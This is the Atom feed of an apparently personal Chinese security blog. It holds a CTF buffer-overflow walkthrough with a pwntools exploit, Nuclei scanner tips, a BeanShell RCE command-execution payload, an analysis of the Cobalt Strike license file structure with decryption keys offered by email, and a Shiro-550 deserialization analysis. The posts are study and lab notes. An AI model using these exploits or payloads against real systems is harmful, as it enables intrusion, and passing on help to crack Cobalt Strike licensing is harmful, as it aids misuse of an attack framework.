<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hi, I&#39;m Arm!tage.</title>
  
  
  <link href="https://an0th3r.github.io/atom.xml" rel="self"/>
  
  <link href="https://an0th3r.github.io/"/>
  <updated>2022-06-02T13:02:23.926Z</updated>
  <id>https://an0th3r.github.io/</id>
  
  <author>
    <name>Arm!tage</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux Buffer Overflow</title>
    <link href="https://an0th3r.github.io/Linux-Buffer-Overflow/"/>
    <id>https://an0th3r.github.io/Linux-Buffer-Overflow/</id>
    <published>2022-06-02T13:02:23.000Z</published>
    <updated>2022-06-02T13:02:23.926Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前置基础知识"><a href="#前置基础知识" class="headerlink" title="前置基础知识"></a>前置基础知识</h2><blockquote><p>本文记录学习ctf-wiki的实验过程</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/</a></p></blockquote><ol><li>汇编中<code>CALL</code>与<code>RET</code>指令</li><li>汇编中高级过程，通过堆栈传递函数参数</li><li>汇编中的函数调用过程及堆栈变化</li><li>gdb使用方法</li></ol><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul><li>[+]ubuntu<ul><li>[+]关闭ASLR。修改&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space文件</li><li>[+]gcc + gcc-multilib</li></ul></li><li>[+]pwntools</li><li>[+]pwngdb（gdb插件）</li></ul><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">gets(s);</span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> args, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">vulnerable();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编译程序"><a href="#编译程序" class="headerlink" title="编译程序"></a>编译程序</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector overflow.c -o example</span><br></pre></td></tr></table></figure><ul><li><code>-m32</code> 执行编译程序为32位程序</li><li><code>-fno-stack-protector</code> 关闭栈溢出保护</li><li><code>-o</code> 编译后输出的文件名</li></ul><h2 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h2><h3 id="下断点"><a href="#下断点" class="headerlink" title="下断点"></a>下断点</h3><p>在gdb中利用函数下断点<code>b vulnerable</code>，函数断在vulnerable入口</p><p><img src="/Linux-Buffer-Overflow/image-20201024002845892.png" alt="image-20201024002845892"></p><p>逐步执行到<code>0x56556239</code>，输入过量的字符</p><p><img src="/Linux-Buffer-Overflow/image-20201024002933886.png" alt="image-20201024002933886"></p><p>继续向下，其中注意栈中的数据覆盖情况，由于输入了过量的字符，缓冲区空间被填满并溢出，溢出的数据将缓冲区后面的地址覆盖</p><p><img src="/Linux-Buffer-Overflow/image-20201024002959099.png" alt="image-20201024002959099"></p><p>继续向下执行查看vulnerable函数的RET指令返回地址，返回地址信息为<code>0x7271706f</code>，该地址信息是连续递减的16进制数字，转换为ascii为<code>rqpo</code>。在计算机中，由于小端显示会将正常的输入翻序，所以原信息为<code>opqr</code>，正好对应上图栈地址中<code>0xffffd04c</code>的内容，而该地址是<code>ebp+4</code>。</p><p><img src="/Linux-Buffer-Overflow/image-20201024003014134.png" alt="image-20201024003014134"></p><p>根据汇编中的RET指令的原理，如果将RET跳转的地址信息进行覆盖，覆盖为一个有效的命令执行地址，那就可以控制程序的执行过程，从而执行我们希望执行的指令。</p><h3 id="构造利用代码"><a href="#构造利用代码" class="headerlink" title="构造利用代码"></a>构造利用代码</h3><p>通过数有次序的字符，可以猜出缓冲区的大小。这个题中缓冲区大小为20个字节，所以要先用20个字节将缓冲区填满<code>\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41</code>，再对<code>EBP</code>进行覆盖<code>\\x42\\x42\\x42\\x42</code>，再拼接要跳转小端显示的地址（该题目要求跳转到success函数中，可以通过IDA Pro等逆向工具获取success函数的内存地址，我是通过在gdb中对success下断点获取到的内存地址），原地址为<code>0x565561ed</code>，经过小端显示处理后为<code>\\xed\\x61\\x55\\x56</code>，将这三个部分进行拼接得到payload</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41</span><br><span class="line">\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41</span><br><span class="line">\\x41\\x41\\x41\\x41\\x42\\x42\\x42\\x42</span><br><span class="line">\\xed\\x61\\x55\\x56</span><br></pre></td></tr></table></figure><p>因为这里的\xed是非打印字符，所以我采用python发送的方式进行调试，利用pwntools进行输入。</p><p>在调试器中成功执行。</p><p><img src="/Linux-Buffer-Overflow/image-20201024003030315.png" alt="image-20201024003030315"></p><h2 id="利用pwntools编写利用代码"><a href="#利用pwntools编写利用代码" class="headerlink" title="利用pwntools编写利用代码"></a>利用pwntools编写利用代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="comment"># p32函数作用是将数字转换为小端显示的byte</span></span><br><span class="line"><span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> p32</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./example&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x80491b6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># buffer_size = 0123456789abcdefghij  ret = klmn   ret = opqr others = stuvwxyz</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x4</span> + p32(success_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>[+]  目前只在调试器中成功执行，在脱离调试器后还无法显示结果，正在努力解决。</li><li>目前对pwntools还不太了解，要熟练掌握。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前置基础知识&quot;&gt;&lt;a href=&quot;#前置基础知识&quot; class=&quot;headerlink&quot; title=&quot;前置基础知识&quot;&gt;&lt;/a&gt;前置基础知识&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;本文记录学习ctf-wiki的实验过程&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Nuclei Tips</title>
    <link href="https://an0th3r.github.io/Nuclei-Tips/"/>
    <id>https://an0th3r.github.io/Nuclei-Tips/</id>
    <published>2022-05-29T10:44:57.000Z</published>
    <updated>2022-05-29T10:44:57.495Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最近使用nuclei比较多，总结一下一些常用的命令和如何配置nuclei能让这个工具更好用</p></blockquote><h2 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h2><ol><li><code>-u</code>：测试单个url时使用，后面跟一个url地址</li><li><code>-l</code>：进行批量测试时使用，后面跟一个写了url地址的文件路径</li><li><code>-t</code>：指定使用的PoC模版</li><li><code>-w</code>：指定使用的workflow模版，workflow模版路径为<code>nuclei-template/workflow</code></li><li><code>-tags</code>：指定使用带有指定tag的PoC模版</li><li><code>-o</code>：将结果输出到一个文件中</li></ol><p>以上这些就是会经常用到的一些参数</p><h2 id="nuclei-template存放路径"><a href="#nuclei-template存放路径" class="headerlink" title="nuclei-template存放路径"></a>nuclei-template存放路径</h2><p>nuclei-template是nuclei的一个非常丰富的官方PoC库，但在使用过程中有一些小问题，就是nuclei-template会默认下载至用户的根目录下</p><ul><li>Linux: <code>/home/user_name/nuclei-template</code></li><li>macOS: <code>/Users/user_name/nuclei-template</code></li><li>Windows: <code>C:\Users\user_name\nuclei-template</code></li></ul><p>很显然，这对一些人来说就很难受，比如我。当然，要修改这个也非常简单。当你运行过一次nuclei之后，nuclei会在用户跟目录下生成一个存放配置文件的路径<code>.config/nuclei</code>，这个路径下通常会有如下几个文件</p><ol><li>config.yaml</li><li>.nuclei-ignore</li><li>.templates-config.json</li></ol><p>打开<code>.templates-config.json</code>，通过修改<code>nuclei-templates-directory</code>的值就可以将nuclei-template的默认保存路径进行修改</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;nuclei-templates-directory&quot;</span><span class="punctuation">:</span><span class="string">&quot;/Users/your_name/nuclei-templates&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;nuclei-templates-version&quot;</span><span class="punctuation">:</span><span class="string">&quot;9.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;nuclei-version&quot;</span><span class="punctuation">:</span><span class="string">&quot;2.7.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;nuclei-ignore-hash&quot;</span><span class="punctuation">:</span><span class="string">&quot;8f61b6d0f735f59c10fc642c688c6624&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;nuclei-latest-version&quot;</span><span class="punctuation">:</span><span class="string">&quot;2.7.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;nuclei-templates-latest-version&quot;</span><span class="punctuation">:</span><span class="string">&quot;9.0.1&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="排除不想要的template"><a href="#排除不想要的template" class="headerlink" title="排除不想要的template"></a>排除不想要的template</h2><p>nuclei-template因为太丰富了，在使用过程中会像AWVS一样扫描出很多无法利用且我们也不关注的问题，这时候就需要用到刚刚配置路径下的<code>.nuclei-ignore</code>配置文件。<br>整个文件使用了YAML结构，修改起来也非常简单。原文件中一共就给了两部分<code>tags</code>与<code>files</code>，可以通过指定tag名称与文件路径排除不想使用的模版文件。下面是例子</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">tags:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;fuzz&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;dos&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;xss&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">files:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">misconfiguration/http-missing-security-headers.yaml</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">ssl/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">dns/ptr-fingerprint.yaml</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">technologies/nginx/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">miscellaneous/options-method.yaml</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">miscellaneous/old-copyright.yaml</span></span><br></pre></td></tr></table></figure><p>nuclei-ignore中的files支持通过指定路径，直接排除该路径下的所有模版文件，这样就可以批量的排除不想使用的模版啦。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;最近使用nuclei比较多，总结一下一些常用的命令和如何配置nuclei能让这个工具更好用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;常用参数&quot;&gt;&lt;a href=&quot;#常用参数&quot; class=&quot;headerlink&quot; title=&quot;常用参数</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>BeanShell RCE 排坑</title>
    <link href="https://an0th3r.github.io/BeanShell-RCE-%E6%8E%92%E5%9D%91/"/>
    <id>https://an0th3r.github.io/BeanShell-RCE-%E6%8E%92%E5%9D%91/</id>
    <published>2022-05-06T10:42:34.000Z</published>
    <updated>2022-05-06T10:42:34.105Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最近在测试过程中遇到了<strong>NC BeanShell RCE</strong>漏洞，网络上大部分都是用BeanShell自带的<code>exec</code>函数执行反弹shell命令，但无法直接执行反弹shell。</p></blockquote><h2 id="寻根溯源"><a href="#寻根溯源" class="headerlink" title="寻根溯源"></a>寻根溯源</h2><p><code>exec</code>函数在BeanShell中定义如下</p><p><img src="/BeanShell-RCE-%E6%8E%92%E5%9D%91/Untitled.png" alt="Untitled"></p><p>参数是一个<code>String</code>类型，并且根据下面的描述是调用了<code>Runtime.getRuntime().exec()</code>。</p><p>搞过Java命令执行的都知道，Java如果要执行命令不能向python之类的直接通过字符串执行命令，需要将命令转化为<code>String[]</code>类型</p><p>所以网络上大部分的poc&#x2F;exp都是只能执行部分命令，无法执行带有各种管道、参数的命令。</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>解决方法也非常简单，既然这里可以使用beanshell script进行命令执行，那我们直接自己用Runtime exec构造命令执行代码就完事了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;whoami&quot;</span>&#125;</span><br><span class="line">Runtime.getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure><p>用了这个payload发现命令可以执行了，但是网站没有回显，写成脚本也没有办法直接获取一些命令的结果，就还得通过生成文件再查看结果，太丑陋了！！</p><p>就想到如果我知道<code>exec</code>方法的实现过程，我再根据这个实现过程去实现刚才的payload就可以完成结果回显。</p><p>直接去找beanshell项目，查找<code>exec</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    Start an external application using the Java Runtime exec() method.</span></span><br><span class="line"><span class="comment">    Display any output to the standard BeanShell output using print().</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">bsh.help.exec = <span class="string">&quot;usage: exec( String arg )&quot;</span>;</span><br><span class="line"></span><br><span class="line">exec( String arg )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">this</span>.proc = Runtime.getRuntime().exec(arg);</span><br><span class="line">    <span class="built_in">this</span>.din = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>( proc.getInputStream() );</span><br><span class="line">    <span class="keyword">while</span>( (line=din.readLine()) != <span class="literal">null</span> )</span><br><span class="line">        print(line);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到它也是用beanshell实现的，我直接开抄。问题优雅解决&lt;(￣︶￣)&gt;</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;最近在测试过程中遇到了&lt;strong&gt;NC BeanShell RCE&lt;/strong&gt;漏洞，网络上大部分都是用BeanShell自带的&lt;code&gt;exec&lt;/code&gt;函数执行反弹shell命令，但无法直接执行反弹shell。&lt;/p&gt;
&lt;/blo</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Cobalt Strike License</title>
    <link href="https://an0th3r.github.io/Cobalt-Strike-License/"/>
    <id>https://an0th3r.github.io/Cobalt-Strike-License/</id>
    <published>2022-05-04T07:13:13.000Z</published>
    <updated>2022-05-04T07:13:13.751Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>跟着许多大佬的文章分析过Cobalt Strike对License认证过程。整个License中最重要的就是解密Key。通过这个解密Key才可以对sleeve中的beacon与加载执行的PE程序进行解密。但在这个blog中不讲整个的认证流程，只说一下License的结构。（License就是cobaltstrike.auth）。由于可能会受Github的DMCA Policy影响，4.0-4.4的解密Key就不直接放出来了。如果有需要，可以直接向我<a href="mailto:an0ther1412@qq.com">发送邮件</a>并表明你的需求；）</p></blockquote><h2 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a>解析过程</h2><p>根据 <code>AuthCrypto.java</code> 中60行判断读取的第一个 Int 长度的数据是否等于 <code>-889274157</code>，进入到<code>else</code>分支中，先读取了一个 Short 长度，并将剩余部分返回。</p><p><img src="/Cobalt-Strike-License/Untitled-1.png" alt="AuthCrypto"></p><p>在上一部分中返回的数据中有进行了如下解析。</p><ol><li>读取Int长度数据作为57行进行License有效时间的判断。</li><li>读取Int长度数据作为水印。</li><li>读取一个Byte长度数据，判断是否大于44作为适用版本判断。</li><li>之后不断的进行读一个Byte，再根据Byte大小读取相同长度的数据。如此循环5次，每个循环分别是读取了4.0版本到4.4版本的解密 Key。 并将读取到最后的解密Key给到 <code>SleeveResource.Setup()</code> 方法中。</li></ol><p><img src="/Cobalt-Strike-License/Untitled.png" alt="Authorization"></p><h2 id="cobaltstrike-auth-结构"><a href="#cobaltstrike-auth-结构" class="headerlink" title="cobaltstrike.auth 结构"></a>cobaltstrike.auth 结构</h2><p>根据 Cobalt Strike 4.4中 <code>AuthCrypto.java</code> 与 <code>Authorization.java</code> 解析过程分析出的 License 结构。</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00  | -889274157</span><br><span class="line">00 00        | 之后的字节数</span><br><span class="line">00 00 00 00  | 29999999</span><br><span class="line">00 00 00 00  | watermark</span><br><span class="line">00           | &gt;43</span><br><span class="line"></span><br><span class="line">00           | Authorization():var8 = 16</span><br><span class="line">00*16        | len = var8 CS4.0 用来对dll解密的密钥 </span><br><span class="line"></span><br><span class="line">00           | Authorization():var10 = 16</span><br><span class="line">00*16        | len = var10 CS4.1 用来对dll解密的密钥 </span><br><span class="line"></span><br><span class="line">00           | Authorization():var12 = 16</span><br><span class="line">00*16        | len = var12 CS4.2 用来对dll解密的密钥 </span><br><span class="line"></span><br><span class="line">00           | Authorization():var14 = 16</span><br><span class="line">00*16        | len = var14 CS4.3 用来对dll解密的密钥 </span><br><span class="line"></span><br><span class="line">00           | Authorization():var14 = 16</span><br><span class="line">00*16        | len = var14 CS4.4 用来对dll解密的密钥 </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;跟着许多大佬的文章分析过Cobalt Strike对License认证过程。整个License中最重要的就是解密Key。通过这个解密Key才可以对sleeve中的beacon与加载执行的PE程序进行解密。但在这个blog中不讲整个的认证流程，只说一</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Shiro-550</title>
    <link href="https://an0th3r.github.io/Shiro-550/"/>
    <id>https://an0th3r.github.io/Shiro-550/</id>
    <published>2022-04-25T02:38:32.000Z</published>
    <updated>2022-04-25T02:38:32.054Z</updated>
    
    <content type="html"><![CDATA[<h2 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h2><ol><li><p>操作系统 macOS</p></li><li><p>直接用homebrew安装tomcat，<code>brew install tomcat@8</code></p></li><li><p>java直接使用oracle java 1.8</p></li><li><p>shiro环境部署时参考了【R1】中的部署方式</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/apache/shiro.git</span></span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-<span class="number">1.2</span><span class="number">.4</span></span><br></pre></td></tr></table></figure></li><li><p>使用idea打开<code>shiro/samples/web</code>目录</p></li><li><p>修改<code>pom.xml</code>，在其中补充</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 在javax.servlet.jstl中补充一个version标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="部署到Tomcat"><a href="#部署到Tomcat" class="headerlink" title="部署到Tomcat"></a>部署到Tomcat</h2><p>在idea中配置tomcat， 在左侧添加Tomcat Server —&gt; Local</p><p><img src="/Shiro-550/Untitled.png" alt="Untitled"></p><p><img src="/Shiro-550/Untitled_1.png" alt="Untitled"></p><p>完成如上配置后点击<code>Apply</code> 保存配置，点击<code>OK</code>关闭<code>Run/Debug Configure</code>窗口。点击一旁的<code>Run</code>按钮，通过浏览器访问配置中的URL配置项的路径（通常会默认打开浏览器访问）查看能否正常运行。</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h3 id="初始化过程"><a href="#初始化过程" class="headerlink" title="初始化过程"></a>初始化过程</h3><p>根据漏洞细节，我们知道shiro使用了一个固定编码的key<code>kPH+bIxk5D2deZiIxcaaaA==</code>，所以直接在整个项目文件中检索该key，找到该文件的所在位置。</p><p><img src="/Shiro-550/Untitled_2.png" alt="Untitled"></p><p>该类实现了<code>RememberMeManager</code>接口，接口有5个方法，不同的认证过程进入不同的函数。</p><p><img src="/Shiro-550/Untitled_3.png" alt="Untitled"></p><p><code>AbstractRememberMeManager</code>在实例化时直接将<code>encryptionCipherKey</code>与<code>decryptionCipherKey</code>进行初始化</p><p><img src="/Shiro-550/Untitled_4.png" alt="Untitled"></p><p>从setCipherKey进入，不断跟进，结果是直接将<code>DEFAULT_CIPHER_KEY_BYTES</code>赋值给<code>encryptionCipherKey</code>与<code>decryptionCipherKey</code></p><p>加密方法直接实例化了一个<code>AesCipherService</code>，由此可以见，加密方法为Aes加密</p><h3 id="序列化过程"><a href="#序列化过程" class="headerlink" title="序列化过程"></a>序列化过程</h3><p>从<code>onSuccessfulLogin</code>跟进程序，首先调用了forgetIdentity方法，但该方法没有任何内容执行。之后判断是否设置rememberMe，所以在登陆是要勾选remember me。之后跟进程序进入<code>rememberidentity</code>，在此处下断点，并用浏览器登陆</p><p><img src="/Shiro-550/Untitled_5.png" alt="Untitled"></p><p><img src="/Shiro-550/Untitled_6.png" alt="Untitled"></p><p>根据调试器中的信息传入<code>rememberIdentity</code>，token为用户的登陆信息，info中包含用户的登陆信息与权限信息</p><p><img src="/Shiro-550/Untitled_7.png" alt="Untitled"></p><p>跟入<code>rememberIdentity</code>方法，首先调用了<code>getIdentityToRemember</code>方法，不断进行跟进，最终将info中的authcinfo中的principals的值返回给变量<code>principals</code></p><p><img src="/Shiro-550/Untitled_8.png" alt="Untitled"></p><p>继续跟进，在另一个<code>rememberIdentity</code>中调用了converPrincipalsToBytes，这个convert函数对之前的得到的principals进行了序列化，并使用了AES加密对序列化后的结果进行加密，密钥就是那一串base64解码后的值。</p><p><img src="/Shiro-550/Untitled_9.png" alt="Untitled"></p><p>跟入<code>rememberSerializedIdentity</code>，将序列化并加密后的数据进行base64编码放入cookie中通过HttpServletResponse传回给浏览器。</p><p><img src="/Shiro-550/Untitled_10.png" alt="Untitled"></p><p>至此shiro框架的登陆凭证加密过程便完成了。</p><h3 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h3><p>根据接口的方法，身份认证可能与<code>getRememberedPrincipals</code>有关，看一下该方法的逻辑</p><p><img src="/Shiro-550/Untitled_11.png" alt="Untitled"></p><p>上来直接调用<code>getRememberedSerializedIdentity</code>，而该方法在类内是一个抽象方法，具体的实现是在<code>CookieRememberMeManager</code>中实现</p><p><img src="/Shiro-550/Untitled_12.png" alt="Untitled"></p><p>实现过程大致是将cookie中的认证信息进行base64解码。</p><p>回到<code>getRememberedPrincipals</code>中，在完成base64解码后调用了<code>convertBytesToPrincipals</code></p><p><img src="/Shiro-550/Untitled_13.png" alt="Untitled"></p><p>在convertBytesToPrincipals方法中，先判断是否初始化了加密服务，如果没有就直接反序列化。</p><p>跟随进入<code>deserialize</code>中，在类属性中声明了<code>DefaultSerializer</code>对象</p><p><img src="/Shiro-550/Untitled_14.png" alt="Untitled"></p><p>还原后的序列化数据被传入deserialze中。通过readObject方法反序列化为一个范型实例，在结果返回过程中回到deserialize方法时进行了强转，得到一个PrincipalCollection对象。</p><p><img src="/Shiro-550/Untitled_15.png" alt="Untitled"></p><h3 id="AES加解密过程"><a href="#AES加解密过程" class="headerlink" title="AES加解密过程"></a>AES加解密过程</h3><p>在序列化与反序列化过程中使用了AES加解密。直接通过动态调试去看AES使用了什么模式进行加解迷，根据上面的分析，断点直接打在<code>decrypt</code>方法中的cipherService判断上查看cipherService中的属性。可以看出AES加解密使用了CBC模式与PKCS5Padding的填充方式。</p><p><img src="/Shiro-550/Untitled_16.png" alt="Untitled"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>【R1】<a href="https://blog.csdn.net/Townmacro/article/details/123999816">Apache Shiro Java 反序列化漏洞分析</a></li><li>【R2】<a href="https://blog.csdn.net/god_zzZ/article/details/108391075">Shiro 550 反序列化漏洞 详细分析+poc编写</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;部署环境&quot;&gt;&lt;a href=&quot;#部署环境&quot; class=&quot;headerlink&quot; title=&quot;部署环境&quot;&gt;&lt;/a&gt;部署环境&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;操作系统 macOS&lt;/p&gt;
